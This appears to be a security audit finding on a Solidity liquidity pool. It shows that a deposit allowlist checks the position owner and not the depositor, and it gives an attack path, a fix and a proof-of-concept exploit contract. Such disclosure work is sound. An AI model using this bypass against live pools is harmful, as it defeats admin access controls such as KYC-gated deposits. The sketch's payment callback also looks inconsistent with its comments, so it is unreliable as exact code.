### Title
`DepositAllowlistExtension` checks `owner` instead of `sender`, allowing any address to bypass the deposit allowlist — (File: `metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

---

### Summary

`DepositAllowlistExtension.beforeAddLiquidity` silently drops the `sender` argument and gates on `owner` (the position recipient) instead. Because `owner` is caller-supplied and completely decoupled from who pays the tokens, any unprivileged address can add liquidity to a restricted pool by nominating any allowlisted address as `owner`.

---

### Finding Description

`MetricOmmPool.addLiquidity` passes two distinct addresses into the extension hook:

- `sender` = `msg.sender` of the `addLiquidity` call — the actual depositor / token payer
- `owner` = the position recipient, freely chosen by the caller [1](#0-0) 

`ExtensionCalling._beforeAddLiquidity` encodes both and forwards them to every configured extension: [2](#0-1) 

`DepositAllowlistExtension.beforeAddLiquidity` receives `(sender, owner, …)` but discards `sender` (the first parameter is unnamed) and checks only `owner`: [3](#0-2) 

The admin-facing setter names the second argument `depositor`, confirming the intended semantics are about the caller, not the position recipient: [4](#0-3) 

Because `owner` is a free parameter supplied by the caller, any address can pass the guard by setting `owner` to any address that the pool admin has already allowlisted.

**Concrete attack path using the production periphery:**

1. Attacker calls `MetricOmmPoolLiquidityAdder.addLiquidityExactShares(pool, owner = Alice, …)` where Alice is an allowlisted depositor.
2. `MetricOmmPoolLiquidityAdder` calls `pool.addLiquidity(owner = Alice, …)`.
3. The pool calls `_beforeAddLiquidity(sender = LiquidityAdder, owner = Alice, …)`.
4. `DepositAllowlistExtension` evaluates `allowedDepositor[pool][Alice]` → `true` → no revert.
5. Liquidity is minted into Alice's position; the attacker's tokens are pulled via the callback. [5](#0-4) 

The same bypass works when calling `pool.addLiquidity` directly from any contract that implements `metricOmmModifyLiquidityCallback`.

---

### Impact Explanation

The deposit allowlist is the primary access-control mechanism for restricted pools (e.g., KYC-gated, institutional, or curated LP sets). The bypass:

- Lets any unprivileged address inject liquidity into a pool the admin explicitly locked down, breaking the admin-boundary invariant.
- Allows an attacker to force an unsolicited position onto any allowlisted address. Because `removeLiquidity` requires `msg.sender == owner`, only Alice can withdraw those funds — the attacker cannot recover them, making this a one-way griefing / donation vector.
- Dilutes the pool's LP composition in ways the admin did not authorize, potentially affecting fee distribution and pool economics for existing LPs.

This satisfies the **admin-boundary break** impact gate: a factory/pool admin-configured guard is bypassed by an unprivileged path.

---

### Likelihood Explanation

- No special privilege is required; any EOA or contract can execute the bypass.
- The only prerequisite is knowing one allowlisted address, which is publicly readable from `allowedDepositor` or observable on-chain.
- The attacker must be willing to spend tokens (they go to the allowlisted owner's position), limiting purely profit-motivated attacks, but griefing or regulatory-evasion scenarios require no profit motive.

Likelihood: **Medium**.

---

### Recommendation

Replace the `owner` check with a `sender` check to gate the actual depositor:

```solidity
function beforeAddLiquidity(address sender, address, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
```

If the intended semantics are to gate position *owners* (not callers), rename the mapping and setter to `allowedOwner` / `setAllowedOwner` to make the design explicit and avoid confusion. Either way, the current implementation does not match the naming (`allowedDepositor`, `setAllowedToDeposit`) and allows a full allowlist bypass.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Assume:
//   pool  = a MetricOmmPool with DepositAllowlistExtension configured
//   alice = an address allowlisted via setAllowedToDeposit(pool, alice, true)
//   bob   = NOT allowlisted

contract BypassDeposit {
    IMetricOmmPoolActions pool;
    IERC20 token0;
    IERC20 token1;

    // Bob calls this; alice is the allowlisted owner
    function exploit(address alice, LiquidityDelta calldata deltas) external {
        // Bob is msg.sender → sender passed to extension = address(this)
        // alice is owner   → extension checks allowedDepositor[pool][alice] = true → passes
        pool.addLiquidity(alice, 0, deltas, abi.encode(address(this)), "");
        // Position minted for alice; bob's tokens pulled in callback below
    }

    function metricOmmModifyLiquidityCallback(
        uint256 amount0Delta,
        uint256 amount1Delta,
        bytes calldata
    ) external {
        // Pay from bob's pre-approved balance
        if (amount0Delta > 0) token0.transferFrom(msg.sender, address(pool), amount0Delta);
        if (amount1Delta > 0) token1.transferFrom(msg.sender, address(pool), amount1Delta);
    }
}
```

Bob's call succeeds despite not being allowlisted, because `DepositAllowlistExtension` only checks `owner = alice`.

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L191-195)
```text
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
      _liquidityContext(), owner, salt, deltas, callbackData, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterAddLiquidity(msg.sender, owner, salt, deltas, amount0Added, amount1Added, extensionData);
```

**File:** metric-core/contracts/ExtensionCalling.sol (L88-99)
```text
  function _beforeAddLiquidity(
    address sender,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_ADD_LIQUIDITY_ORDER,
      abi.encodeCall(IMetricOmmExtensions.beforeAddLiquidity, (sender, owner, salt, deltas, extensionData))
    );
  }
```

**File:** metric-periphery/contracts/extensions/DepositAllowlistExtension.sol (L18-20)
```text
  function setAllowedToDeposit(address pool_, address depositor, bool allowed) external onlyPoolAdmin(pool_) {
    allowedDepositor[pool_][depositor] = allowed;
    emit AllowedToDepositSet(pool_, depositor, allowed);
```

**File:** metric-periphery/contracts/extensions/DepositAllowlistExtension.sol (L32-42)
```text
  function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
      revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```
